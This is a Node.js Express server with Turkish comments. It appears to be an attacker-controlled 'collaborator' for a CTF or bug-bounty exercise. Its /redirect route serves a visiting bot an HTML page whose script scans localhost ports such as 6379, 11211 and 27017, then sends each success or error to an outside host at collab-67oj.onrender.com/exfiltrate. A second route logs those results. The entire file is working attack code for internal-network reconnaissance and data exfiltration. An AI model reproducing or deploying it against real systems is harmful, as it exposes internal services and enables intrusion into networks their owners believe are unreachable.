const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/redirect', (req, res) => {
    console.log("\n--- BOT Yakalandı! Genişletilmiş İç Servis Taraması Başlatılıyor ---");
    
    const htmlPayload = `
    <html>
      <body>
        <h2>Scanning internal services...</h2>
        <script>
          // Genişletilmiş iç port listesi (Web, Veritabanı, Önbellek, Admin servisleri)
          const internalPorts = [
            80, 443, 3000, 5000, 6379, 8080, 8443, 8888, 9000, 11211, 27017
          ];
          
          internalPorts.forEach(port => {
            const targetUrl = "http://127.0.0.1:" + port + "/";
            
            fetch(targetUrl, { mode: 'no-cors' })
              .then(response => {
                // Eğer hata fırlatmazsa veya yanıt dönerse bildir
                fetch('https://collab-67oj.onrender.com/exfiltrate?status=success&port=' + port);
              })
              .catch(error => {
                // Hata türünü ayırt etmek için hata mesajını gönderiyoruz
                fetch('https://collab-67oj.onrender.com/exfiltrate?status=error&port=' + port + '&err=' + encodeURIComponent(error.toString()));
              });
          });
        </script>
      </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlPayload);
});

app.get('/exfiltrate', (req, res) => {
    console.log("Servis Tarama Sonucu:", req.query);
    return res.status(200).send("OK");
});

app.use((req, res) => {
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
